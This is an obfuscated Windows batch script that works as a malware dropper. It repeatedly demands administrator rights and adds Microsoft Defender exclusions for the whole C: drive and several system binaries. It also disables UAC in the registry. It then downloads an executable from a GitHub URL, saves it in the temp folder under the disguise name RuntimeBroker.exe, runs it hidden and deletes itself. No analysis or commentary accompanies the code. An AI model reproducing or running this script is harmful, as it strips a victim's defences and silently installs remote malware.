@echo off & setlocal enableDelayedExpansion
set "qFHY=>nul" & set "sOBSp=2>&1" & set "Hpzn=NET" & set "ZYYze=SESSION"
%Hpzn% %ZYYze% %qFHY% %sOBSp%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "KhThL=foo" & set "CLX=bar" & set "RYLs=qux" & set "zMU=baz" & rem IiUIF UxycTW UtN
set "Jwd=powershell -ExecutionPolicy Bypass -Command"
set "CtWU=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "CcyrD='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "otMU='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!Jwd! "!CtWU! !CcyrD! !otMU!" %qFHY% %sOBSp%
set "qzA=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "eSEt=-Name 'EnableLUA' -Value 0"
!Jwd! "!qzA! !eSEt!" %qFHY% %sOBSp%
set "xZxCf=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!Jwd! "!xZxCf!" %qFHY% %sOBSp%
if !errorlevel! neq 0 (goto %a%)
set "FqEGn=timeout /t" & !FqEGn! 2 %qFHY% %sOBSp%
set "EXx=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "SAx=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "HLko=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!Jwd! "!EXx! !SAx! !HLko!" %qFHY% %sOBSp%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!FqEGn! 1 %qFHY% %sOBSp% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %qFHY% %sOBSp%
del /f /q "%~f0" %qFHY% %sOBSp%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %qFHY% %sOBSp%
if !errorlevel! neq 0 (!FqEGn! 3 %qFHY% %sOBSp% & goto %b%)
exit /b
